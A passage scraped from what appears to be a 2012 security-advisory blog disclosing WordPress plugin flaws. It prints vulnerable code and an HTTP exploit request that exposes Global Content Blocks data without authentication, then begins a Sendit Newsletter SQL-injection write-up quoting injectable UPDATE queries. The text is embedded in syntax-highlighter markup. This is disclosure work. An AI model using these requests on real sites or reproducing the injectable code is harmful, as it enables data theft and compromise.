			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_GET["gcb"])) (die("Please select some values"));
require_once('../../../../wp-load.php');
global $wpdb;

$ids = explode(";",$_GET["gcb"]);
$final_text = array();

foreach($ids as $id) {
    if(intval($id)&gt;0) {
        $entry = $wpdb-&gt;get_row("select * from ".$wpdb-&gt;prefix."gcb where id=".intval(mysql_real_escape_string($id)));
        $final_text[] =
        base64_encode($entry-&gt;name)."".
        base64_encode($entry-&gt;description)."".
        base64_encode($entry-&gt;value)."".
        base64_encode($entry-&gt;type);        
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-2">2</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-4">4</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-6">6</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-8">8</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-10">10</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-12">12</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-14">14</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b0b931493027-16">16</div><div class="crayon-num" data-line="crayon-53c9878f27b0b931493027-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27b0b931493027-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Please select some values"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-2"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-3"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-5"><span class="crayon-sy">$</span><span class="crayon-v">ids</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">";"</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-6"><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-8"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">ids </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">entry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select * from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">description</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">type</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b0b931493027-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f27b0b931493027-17"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0055 seconds] -->
<p>Again there is a lack of validation that the user is logged in and has sufficient privileges to view this data normally. And because it may contain php code that is sensitive, it offers a source code disclosure vulnerability we can exploit like this. Note the semi-colon separated id list, which makes this very handy.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27b12745456535" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1;2;3 HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27b12745456535-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27b12745456535-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27b12745456535-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">gcb</span><span class="crayon-o">/</span><span class="crayon-v">gcb_export</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">gcb</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span><span class="crayon-cn">2</span><span class="crayon-sy">;</span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27b12745456535-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/global-content-blocks/" rel="tag">Global Content Blocks</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/#respond" title="Comment on WordPress Global Content Blocks multiple vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-37 -->

				
					
<article id="post-43" class="post-43 post type-post status-publish format-standard hentry category-advisories tag-sendit-newsletter tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/" title="11:42 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-10T23:42:47+00:00" pubdate>July 10, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/" title="Permalink to WordPress Sendit Newsletter plugin multiple SQL injection" rel="bookmark">WordPress Sendit Newsletter plugin multiple SQL injection</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49506/">Secunia Advisory SA 49506</a></p>
<p><strong>Analysis</strong><br />
A SQL injection vulnerability exists in the <a href="http://plugins.svn.wordpress.org/sendit/tags/2.1.0/ajax.php">ajax.php</a> file of the Sendit Newsletter plugin for WordPress, which is used for setting the subscribed or unsubscribed flag on an email.</p>
<p>By passing in an arbitrary key-pair value, we see that because of line 9, it will use the key-pair for the SET statement on line 17/27 without any validation. It will also explode(Split into an array) the ID value on line 10 and 11 and put the &#8220;ID&#8221; into a variable later used, without validating that it is an integer. This is then also used on line 17/27, and is also exploitable.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2818e895503366" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
include("../../../wp-blog-header.php");
status_header(200);
nocache_headers();
require_once 'libs/actions.php';
global $wpdb;
//print_r($_POST);
//let me parse
foreach($_POST as $k=&gt;$v):
    $id= explode("-", $_POST['id']);
    $id=$id[1];

    if($k!='id'):
        if($k!='email'):
            //serializer update
            $subscriber_info=json_encode($_POST);
            $update=$wpdb-&gt;query("update ".SENDIT_EMAIL_TABLE." set $k = '$v' where id_email = $id");     
            //$update="update ".SENDIT_EMAIL_TABLE." set subscriber_info = '$subscriber_info' where id_email = $id";
            if($v=='y') { $confirmed='confirmed'; $style='vertical-align:middle; background:#E4FFCF;'; } 
            elseif($v=='d') {$confirmed='unsubscribed'; $style='vertical-align:middle; background:#fd919b';} 
            elseif($v=='n') {$confirmed='not confirmed'; $style='vertical-align:middle; background:#fffbcc;';} 
            else {}
            echo '&lt;div style="'.$style.'display:block;height:35px"&gt;';
                echo $confirmed;
            echo '&lt;/div&gt;';
        else:   
            $update=$wpdb-&gt;query("update ".SENDIT_EMAIL_TABLE." set $k = '$v' where id_email = $id");

            echo $v;
        endif;
    endif;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-22">22</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-24">24</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-26">26</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-28">28</div><div class="crayon-num" data-line="crayon-53c9878f2818e895503366-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2818e895503366-30">30</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2818e895503366-1"><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-s">"../../../wp-blog-header.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-2"><span class="crayon-e">status_header</span><span class="crayon-sy">(</span><span class="crayon-cn">200</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-3"><span class="crayon-e">nocache_headers</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-4"><span class="crayon-i">require_once</span><span class="crayon-h"> </span><span class="crayon-s">'libs/actions.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-5"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-6"><span class="crayon-c">//print_r($_POST);</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-7"><span class="crayon-c">//let me parse</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-8"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">_POST </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">v</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"-"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">k</span><span class="crayon-o">!=</span><span class="crayon-s">'id'</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">k</span><span class="crayon-o">!=</span><span class="crayon-s">'email'</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//serializer update</span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">subscriber_info</span><span class="crayon-o">=</span><span class="crayon-e">json_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">_POST</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">update</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"update "</span><span class="crayon-sy">.</span><span class="crayon-v">SENDIT_EMAIL_TABLE</span><span class="crayon-sy">.</span><span class="crayon-s">" set $k = '$v' where id_email = $id"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//$update="update ".SENDIT_EMAIL_TABLE." set subscriber_info = '$subscriber_info' where id_email = $id";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'y'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'confirmed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#E4FFCF;'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'unsubscribed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#fd919b'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">v</span><span class="crayon-o">==</span><span class="crayon-s">'n'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">confirmed</span><span class="crayon-o">=</span><span class="crayon-s">'not confirmed'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-o">=</span><span class="crayon-s">'vertical-align:middle; background:#fffbcc;'</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2818e895503366-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2818e895503366-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div style="'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">style</span><span class="crayon-sy">.</span><span class="crayon-s">'display:block;height:35px"&gt;'</span><span 